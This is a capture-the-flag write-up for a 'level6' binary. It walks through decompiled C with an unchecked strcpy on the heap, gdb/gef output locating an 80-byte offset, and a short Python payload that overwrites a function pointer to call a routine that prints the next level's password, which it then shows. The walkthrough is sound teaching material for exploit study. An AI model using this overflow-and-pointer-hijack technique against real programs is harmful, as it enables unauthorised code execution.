# level6

The `level6` binary seems to do something with its arguments.

Here's the `main` function of the program :

```c
void main(int argc, char** argv)
{
  char *__dest;
  callable **fnPtr; // callable isn't a type, it's a placeholder for a function pointer
  
  __dest = (char *)malloc(64);
  fnPtr = (callable **)malloc(4);
  *fnPtr = m;
  strcpy(__dest,*(char **)(argv + 4));
  (**fnPtr)();
  return;
}
```

The `m` function looks like this :

```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  puts("Nope");
  return;
}
```

And a never called `c` function looks like this :

```c
void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}
```

So our goal is to call the `c` function somehow. Since there's a non-protected call to `strcpy` in the `main` function, we can overwrite the `fnPtr` variable to point to the `n` function instead of the `m` function.

First we have to find the offset. We can use `gdb` and `gef` to do that :

```bash
$ gdb level6
gef➤ pattern create
[+] Generating a pattern of 1024 bytes (n=4)
[+] Saved as '$_gef0'
gef➤ r <pattern>
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x61616175 ("uaaa"?)
$ebx   : 0xf7f93ff4  →  0x001e7d8c
$ecx   : 0x0       
$edx   : 0xf7f93ff4  →  0x001e7d8c
$esp   : 0xffffc7fc  →  0x080484d2  →  <main+86> leave 
$ebp   : 0xffffc828  →  0x00000000
$esi   : 0x080484e0  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616175 ("uaaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffc7fc│+0x0000: 0x080484d2  →  <main+86> leave       ← $esp
0xffffc800│+0x0004: 0x0804a1a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
0xffffc804│+0x0008: 0xffffcaf1  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
0xffffc808│+0x000c: 0xf7fc1400  →  0xf7dac000  →  0x464c457f
0xffffc80c│+0x0010: 0x00000000
0xffffc810│+0x0014: 0x00000000
0xffffc814│+0x0018: 0x00000000
0xffffc818│+0x001c: 0x0804a1f0  →  "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616175
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "level6_bin", stopped 0x61616175 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Missing separate debuginfos, use: dnf debuginfo-install glibc-2.37-13.fc38.i686
gef➤ pattern search $eax
[+] Searching for '75616161'/'61616175' with period=4
[+] Found at offset 80 (little-endian search) likely
gef➤ p n
$1 = {<text variable, no debug info>} 0x8048454 <n>
```

Okay, now that we know all this, we can write a script to exploit the binary :

```python
import struct
import subprocess

N_ADDY = 0x8048454
SIZE = 80 - 8 # 4 for the callable pointer, 4 for the return address

payload = b'A' * SIZE
payload += struct.pack('<I', N_ADDY)
print payload
```

```sh
$ ./level6 $(python /tmp/bdf.py)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```